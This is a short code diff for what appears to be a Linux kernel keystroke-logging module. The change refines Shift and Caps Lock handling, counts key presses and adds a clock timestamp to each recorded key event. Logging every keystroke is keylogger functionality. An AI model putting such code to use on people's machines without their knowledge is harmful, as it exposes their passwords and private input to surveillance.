@@ -49,6 +49,7 @@ void handle_shift_pressed(struct key_entry *node)
 int new_node(unsigned char kc)
 {
 	struct key_entry *new;
+	struct rtc_time t = rtc_ktime_to_tm(ktime_get_real());
 
 	if (!is_undifined(kc))
 		return 0;
@@ -71,15 +72,23 @@ int new_node(unsigned char kc)
 		new->state = Released;
 	}
 
-	if ((gmodifiers & LShift || gmodifiers & RShift) && new->k_data.ascii_key != 0x0)
+	if (new->k_data.ascii_key != 0x0)
 	{
-		handle_shift_pressed(new);
+		if (gmodifiers & LShift || gmodifiers & RShift)
+			handle_shift_pressed(new);
+		else if (gmodifiers & Capslock)
+		{
+			if (is_alpha(new->k_data.ascii_key))
+				new->k_data.ascii_key = to_upper(new->k_data.ascii_key);
+		}
+		if (new->state != Released)
+			kps_data.aLen++;
 	}
-	else if (gmodifiers & Capslock && new->k_data.ascii_key != 0x0)
-	{
-		if (is_alpha(new->k_data.ascii_key))
-			new->k_data.ascii_key = to_upper(new->k_data.ascii_key);
-	}
+	
+	
+	new->hh = t.tm_hour;
+	new->mm = t.tm_min;
+	new->ss = t.tm_sec;
 
 	mutex_lock(&kps_data.lock);
 	list_add_tail(&new->list, &kps_data.entries);
